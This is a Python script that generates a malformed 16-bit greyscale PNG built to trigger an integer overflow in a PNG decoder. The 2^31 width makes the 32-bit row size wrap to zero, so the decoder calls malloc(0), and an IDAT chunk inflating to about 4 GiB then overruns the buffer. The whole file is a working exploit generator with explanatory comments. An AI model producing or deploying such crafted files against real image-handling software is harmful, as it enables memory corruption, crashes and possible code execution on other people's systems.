#!/usr/bin/env python3
# gen_png_gray.py -- greyscale wrap PNG (NOT rgba).
#   width=0x80000000 (2^31), height=1, 16-bit greyscale (bpp=2)
#   rowbytes = 0x80000000 * 2 = 2^32 -> wraps to 0  (32-bit mul w)
#   allocation = 1 * 0 = 0 -> malloc(0).  IDAT inflates to 4GiB -> OOB.
import struct, zlib, binascii, os, sys, time

OUT = sys.argv[1] if len(sys.argv) > 1 else "/home/box/.hermes/profiles/seraphine/cache/scratch/pngs"
os.makedirs(OUT, exist_ok=True)

def chunk(t, p):
    return struct.pack(">I", len(p)) + t + p + struct.pack(">I", binascii.crc32(t + p) & 0xffffffff)

W  = 0x80000000          # 2^31 = 2147483648
H  = 1
BD = 16; CT = 0          # 16-bit GREYSCALE (colortype 0), bpp=2
rowbytes = W * 2         # 0x100000000 = 4 GiB -> wraps to 0 in 32-bit

print(f"width={W} height={H} 16-bit GREYSCALE  rowbytes={rowbytes} (0x{rowbytes:x}) -> 32-bit wraps to {rowbytes & 0xffffffff}")

t0 = time.time()
co = zlib.compressobj(6)
out = bytearray()
out += co.compress(b"\x00")                 # filter byte for the single scanline
zeros = b"\x00" * (1024 * 1024)
fed = 0
while fed < rowbytes:
    n = min(len(zeros), rowbytes - fed)
    out += co.compress(zeros[:n]); fed += n
out += co.flush()
idat = bytes(out)
print(f"IDAT: decompressed {1+rowbytes} bytes (~4.3GB) -> compressed {len(idat)} bytes  ({time.time()-t0:.1f}s)")

sig  = bytes.fromhex("89504E470D0A1A0A")
ihdr = struct.pack(">IIBBBBB", W, H, BD, CT, 0, 0, 0)
png  = sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
p = os.path.join(OUT, "g.png")
open(p, "wb").write(png)
print(f"wrote {p} ({len(png)}B; IDAT {len(idat)}B)")
